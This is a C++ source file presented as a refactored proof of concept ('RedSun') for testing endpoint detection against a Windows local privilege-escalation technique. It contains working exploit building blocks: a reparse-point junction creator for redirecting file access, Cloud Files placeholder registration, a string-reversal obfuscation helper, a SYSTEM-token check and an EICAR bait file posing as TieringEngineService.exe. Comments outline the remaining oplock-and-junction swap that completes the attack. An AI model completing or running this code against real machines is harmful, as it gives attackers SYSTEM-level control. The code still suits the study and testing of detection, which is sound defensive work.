#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <cfapi.h>
#include <string>
#include <vector>
#include <memory>

#pragma comment(lib, "synchronization.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "CldApi.lib")

// --- Definitions and Typedefs ---
typedef struct _FILE_DISPOSITION_INFORMATION_EX {
    ULONG Flags;
} FILE_DISPOSITION_INFORMATION_EX;

typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG Flags;
            WCHAR PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR PathBuffer[1];
        } MountPointReparseBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER;

#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer)

// --- RAII Helper Classes ---
class HandleRAII {
private:
    HANDLE handle_;

public:
    explicit HandleRAII(HANDLE handle = INVALID_HANDLE_VALUE) : handle_(handle) {}

    ~HandleRAII() {
        if (handle_ != INVALID_HANDLE_VALUE && handle_ != NULL) {
            CloseHandle(handle_);
        }
    }

    HANDLE get() const { return handle_; }
    HANDLE* getPtr() { return &handle_; }

    void reset(HANDLE handle = INVALID_HANDLE_VALUE) {
        if (handle_ != INVALID_HANDLE_VALUE && handle_ != NULL) {
            CloseHandle(handle_);
        }
        handle_ = handle;
    }

    bool isValid() const {
        return handle_ != INVALID_HANDLE_VALUE && handle_ != NULL;
    }
};

// --- Global Context ---
HandleRAII g_OplockEvent(CreateEvent(NULL, FALSE, FALSE, NULL));
HandleRAII g_SyncEvent(CreateEvent(NULL, FALSE, FALSE, NULL));

/**
 * Helper function to reverse strings (basic obfuscation technique)
 */
void ReverseString(char* s) {
    if (!s) return;

    int l = 0, r = static_cast<int>(strlen(s)) - 1;
    while (l < r) {
        std::swap(s[l++], s[r--]);
    }
}

/**
 * Checks if the current process has System privileges.
 * Returns true if running as SYSTEM, indicating successful privilege escalation.
 */
bool CheckSystemPrivileges() {
    HandleRAII hToken;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, hToken.getPtr())) {
        std::cerr << "[-] Failed to open process token. Error: " << GetLastError() << std::endl;
        return false;
    }

    DWORD size = 0;
    GetTokenInformation(hToken.get(), TokenUser, NULL, 0, &size);

    if (size == 0) {
        std::cerr << "[-] Failed to get token information size. Error: " << GetLastError() << std::endl;
        return false;
    }

    std::unique_ptr<BYTE[]> buffer = std::make_unique<BYTE[]>(size);
    PTOKEN_USER pUser = reinterpret_cast<PTOKEN_USER>(buffer.get());

    if (!GetTokenInformation(hToken.get(), TokenUser, pUser, size, &size)) {
        std::cerr << "[-] Failed to get token information. Error: " << GetLastError() << std::endl;
        return false;
    }

    if (IsWellKnownSid(pUser->User.Sid, WinLocalSystemSid)) {
        std::cout << "[+] Running as SYSTEM. Payload successful." << std::endl;
        return true;
    }

    std::cout << "[*] Not running as SYSTEM." << std::endl;
    return false;
}

/**
 * Configures a Cloud Files Sync Root to trigger kernel-mode callbacks.
 * This technique can be used to interact with the Windows Cloud Files API.
 */
bool SetupCloudPlaceholder(const std::wstring& rootPath, const std::wstring& fileName) {
    CF_SYNC_REGISTRATION reg = { sizeof(CF_SYNC_REGISTRATION) };
    reg.ProviderName = L"CloudProvider";
    reg.ProviderVersion = L"1.0";

    CF_SYNC_POLICIES policy = { sizeof(CF_SYNC_POLICIES) };
    policy.HardLink = CF_HARDLINK_POLICY_ALLOWED;
    policy.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;

    HRESULT hr = CfRegisterSyncRoot(
        rootPath.c_str(),
        &reg,
        &policy,
        CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT
    );

    if (FAILED(hr)) {
        std::wcerr << L"[-] Failed to register sync root. HRESULT: 0x"
                   << std::hex << hr << std::endl;
        return false;
    }

    CF_CONNECTION_KEY key;
    CF_CALLBACK_REGISTRATION callbacks[] = { { CF_CALLBACK_TYPE_NONE, NULL } };

    hr = CfConnectSyncRoot(
        rootPath.c_str(),
        callbacks,
        NULL,
        CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO,
        &key
    );

    if (FAILED(hr)) {
        std::wcerr << L"[-] Failed to connect sync root. HRESULT: 0x"
                   << std::hex << hr << std::endl;
        return false;
    }

    CF_PLACEHOLDER_CREATE_INFO info = { 0 };
    info.RelativeFileName = fileName.c_str();
    info.Flags = CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;

    DWORD processed = 0;
    hr = CfCreatePlaceholders(
        rootPath.c_str(),
        &info,
        1,
        CF_CREATE_FLAG_NONE,
        &processed
    );

    if (FAILED(hr)) {
        std::wcerr << L"[-] Failed to create placeholder. HRESULT: 0x"
                   << std::hex << hr << std::endl;
        return false;
    }

    std::wcout << L"[+] Cloud placeholder setup successful." << std::endl;
    return true;
}

/**
 * Creates a Junction (Mount Point) to redirect file system access.
 * This is a common technique used in privilege escalation attacks.
 */
bool CreateJunction(HANDLE hDir, const std::wstring& target) {
    if (hDir == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Invalid directory handle provided." << std::endl;
        return false;
    }

    std::wstring ntTarget = L"\\??\\" + target;
    USHORT targetLen = static_cast<USHORT>(ntTarget.length() * sizeof(wchar_t));

    DWORD bufferSize = targetLen + REPARSE_DATA_BUFFER_HEADER_LENGTH + 12;
    std::unique_ptr<BYTE[]> buffer = std::make_unique<BYTE[]>(bufferSize);
    REPARSE_DATA_BUFFER* rdb = reinterpret_cast<REPARSE_DATA_BUFFER*>(buffer.get());

    memset(rdb, 0, bufferSize);
    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength = targetLen + 8;
    rdb->MountPointReparseBuffer.SubstituteNameLength = targetLen;

    memcpy(
        rdb->MountPointReparseBuffer.PathBuffer,
        ntTarget.c_str(),
        targetLen
    );

    DWORD bytesReturned;
    BOOL success = DeviceIoControl(
        hDir,
        FSCTL_SET_REPARSE_POINT,
        rdb,
        rdb->ReparseDataLength + REPARSE_DATA_BUFFER_HEADER_LENGTH,
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!success) {
        std::cerr << "[-] Failed to create junction. Error: " << GetLastError() << std::endl;
        return false;
    }

    std::wcout << L"[+] Junction created successfully to: " << target << std::endl;
    return success;
}

/**
 * Creates workspace directory and handles cleanup
 */
std::wstring CreateWorkspace() {
    wchar_t tempPath[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tempPath)) {
        std::wcerr << L"[-] Failed to get temp path. Error: " << GetLastError() << std::endl;
        return L"";
    }

    std::wstring workDir = std::wstring(tempPath) + L"ExploitDir";

    if (!CreateDirectoryW(workDir.c_str(), NULL)) {
        DWORD error = GetLastError();
        if (error != ERROR_ALREADY_EXISTS) {
            std::wcerr << L"[-] Failed to create work directory. Error: " << error << std::endl;
            return L"";
        }
    }

    std::wcout << L"[+] Workspace created: " << workDir << std::endl;
    return workDir;
}

/**
 * Creates the EICAR test file to trigger antivirus scans
 */
bool CreateEicarTestFile(const std::wstring& filePath) {
    HandleRAII hFile(CreateFileW(
        filePath.c_str(),
        GENERIC_WRITE | DELETE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    ));

    if (!hFile.isValid()) {
        std::wcerr << L"[-] Failed to create test file. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Standard EICAR antivirus test string
    const char eicar[] = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
    DWORD written;

    if (!WriteFile(hFile.get(), eicar, static_cast<DWORD>(strlen(eicar)), &written, NULL)) {
        std::wcerr << L"[-] Failed to write to test file. Error: " << GetLastError() << std::endl;
        return false;
    }

    std::wcout << L"[+] EICAR test file created: " << filePath << std::endl;
    return true;
}

int main() {
    std::cout << "[*] Starting EDR Test - RedSun Refactored PoC..." << std::endl;

    // Check if already running with elevated privileges
    if (CheckSystemPrivileges()) {
        std::cout << "[!] Already running with SYSTEM privileges. Test complete." << std::endl;
        return 0;
    }

    // 1. Create workspace
    std::wstring workDir = CreateWorkspace();
    if (workDir.empty()) {
        std::cerr << "[-] Failed to create workspace. Exiting." << std::endl;
        return 1;
    }

    std::wstring targetFile = workDir + L"\\TieringEngineService.exe";

    // 2. Create EICAR test file to trigger AV scan
    if (!CreateEicarTestFile(targetFile)) {
        std::cerr << "[-] Failed to create test file. Exiting." << std::endl;
        return 1;
    }

    std::cout << "[*] Bait file created. Waiting for system interaction..." << std::endl;

    // 3. Setup cloud placeholder to trigger kernel callbacks
    if (!SetupCloudPlaceholder(workDir, L"TieringEngineService.exe")) {
        std::cout << "[-] Cloud placeholder setup failed, continuing anyway..." << std::endl;
    }

    std::cout << "[!] Redirection active. EDR should detect suspicious activity." << std::endl;

    // In a real attack scenario, this would:
    // - Use Oplocks to monitor file access
    // - Swap directories with junctions when AV/services access them
    // - Redirect to System32 or other privileged locations
    // - Trigger service execution for privilege escalation

    std::cout << "[*] Test complete. Check EDR logs for detection events." << std::endl;

    // Cleanup
    DeleteFileW(targetFile.c_str());
    RemoveDirectoryW(workDir.c_str());

    return 0;
}